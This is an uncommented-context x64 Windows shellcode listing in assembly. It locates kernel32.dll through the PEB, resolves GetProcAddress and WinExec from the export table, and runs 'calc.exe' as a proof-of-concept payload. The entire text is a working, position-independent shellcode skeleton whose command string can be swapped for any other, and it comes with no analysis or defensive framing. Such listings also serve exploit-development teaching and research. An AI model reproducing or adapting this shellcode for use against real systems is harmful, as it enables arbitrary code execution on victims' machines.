start:
    mov rbp, rsp;          // Save stack pointer
    sub rsp, 0x1000;       // Allocate 4KB of stack space
getKernel32BaseAddress:
    mov rax, gs:0x60;      // Get Pointer to _PEB from _TEB structure
    mov rax, [rax + 0x18]; // Get PEB_LDR_DATA from _PEB structure
    mov rsi, [rax + 0x20]; // Get InMemoryOrderModuleList from PEB_LDR_DATA structure
    lodsq;                 // Get the first entry in the InMemoryOrderModuleList
    xchg rax, rsi;         // Save the first entry in rsi
    lodsq;                 // Get the second entry in the InMemoryOrderModuleList
    mov rax, [rax + 0x20]; // Get the base address of kernel32.dll
    mov rbx, rax;          // Save the base address of kernel32.dll in r8
findExportAddressTable:
    xor rcx, rcx;                // Clear rcx
    xor rax, rax;                // Clear rax
    mov ecx, [rbx + 0x3c];       // Get PE Header offset
    mov eax, [rbx + rcx + 0x88]; // Get Export Table Directory RVA
    add rax, rbx;                // Move to Export Table Directory
    mov r8d, [rax + 0x1c];       // Get the AddressOfFunctions
    mov r9d, [rax + 0x20];       // Get the AddressOfNames
    add r8, rbx;                 // Fullup AddressOfFunctions
    add r9, rbx;                 // Fullup AddressOfNames
    xor rcx, rcx;                // Clear rcx
    mov rdx, 0x41636f7250746547; // "GetProcAddress" but "GetProcA"
getFunction:
    inc rcx;
    mov eax, [r9 + rcx * 4]; // Get the pointer to function name
    add rax, rbx;            // Fullup address of pointer to function name
    mov rax, [rax];          // Get the function name
    cmp rax, rdx;            // Compare the function name with "GetProcA"
    jnz getFunction;         // Loop until we find GetProcAddress
saveFoundFunction:
    mov eax, [r8 + rcx * 4]; // Get the pointer to function address
    add rax, rbx;            // Fullup address of pointer to function address
    mov [rbp+0x8], rax;      // Save the address of GetProcAddress
findFunctionByGetProcA:
    mov rcx, 0x636578456e6957; // "WinExec"
    push rcx;                  // Push "WinExec" to the stack
    mov rdx, rsp;              // Save the address of "WinExec"
    mov rcx, rbx;              // Save the base address of kernel32.dll
    sub rsp, 0x30;             // Allocate space for the function call
    call [rbp+0x8];            // Call GetProcAddress
    add rsp, 0x30;             // Clearn sapce for the function call
    mov rsi, rax;              // Save the address of WinExec
callWinExec:
    xor rcx, rcx;                // Clear rcx
    push rcx;                    // Push 0 to the stack
    mov rcx, 0x6578652e636c6163; // "calc.exe"
    push rcx;                    // Push "calc.exe" to the stack
    mov rcx, rsp;                // Save the address of "calc.exe"
    mov rdx, 0x1;                // Show the window
    call rsi;                    // Call WinExec